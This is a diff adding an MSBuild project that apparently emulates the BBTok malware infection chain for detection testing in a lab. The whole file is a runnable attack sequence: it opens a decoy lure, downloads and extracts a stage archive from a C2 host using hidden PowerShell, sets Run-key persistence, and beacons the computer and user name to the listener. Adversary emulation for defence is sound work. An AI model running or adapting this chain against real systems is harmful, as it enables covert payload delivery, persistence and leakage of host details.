@@ -1,0 +1,33 @@
+<Project ToolsVersion="4.0" DefaultTargets="EDRChain" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+
+  <!-- ====== Adjust these for your lab ====== -->
+  <PropertyGroup>
+    <KaliIP>10.99.156.47</KaliIP>
+    <C2Port>8080</C2Port>
+    <WorkDir>C:\ProgramData\BBTok</WorkDir>
+  </PropertyGroup>
+
+  <Target Name="EDRChain">
+    <!-- 1) Open decoy document (lure) -->
+    <Exec Command="start &quot;%CD%\decoy.pdf&quot;" IgnoreExitCode="true" />
+
+    <!-- 2) Create a benign 'infection marker' (mutex) -->
+    <Exec Command="powershell.exe -NoP -W Hidden -Command &quot;[System.Threading.Mutex]::new($false,'BBTok_Mutex') | Out-Null&quot;" />
+
+    <!-- 3) Make a working directory -->
+    <Exec Command="cmd.exe /c mkdir &quot;$(WorkDir)&quot;" IgnoreExitCode="true" />
+
+    <!-- 4) Download harmless ZIP from Kali into %TEMP% (IWR over HTTP) -->
+    <Exec Command="powershell.exe -NoP -W Hidden -Command &quot;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr 'http://$(KaliIP):$(C2Port)/stage.zip' -OutFile $env:TEMP\stage.zip -UseBasicParsing&quot;" />
+
+    <!-- 5) Extract ZIP into working directory (creates file I/O noise) -->
+    <Exec Command="powershell.exe -NoP -W Hidden -Command &quot;$d='$(WorkDir)'; if (Test-Path $env:TEMP\stage.zip) { Expand-Archive -LiteralPath $env:TEMP\stage.zip -DestinationPath $d -Force }&quot;" />
+
+    <!-- 6) Persistence (benign): HKCU Run key calling rundll32 URL handler -->
+    <Exec Command="reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BBTok /t REG_SZ /d &quot;rundll32.exe url.dll,FileProtocolHandler http://$(KaliIP):$(C2Port)/persist&quot; /f" />
+
+    <!-- 7) One-shot 'beacon' (benign): rundll32 opening a URL to your Kali listener -->
+    <Exec Command="rundll32.exe url.dll,FileProtocolHandler http://$(KaliIP):$(C2Port)/beacon?host=%COMPUTERNAME%&amp;user=%USERNAME%" />
+  </Target>
+
+</Project>
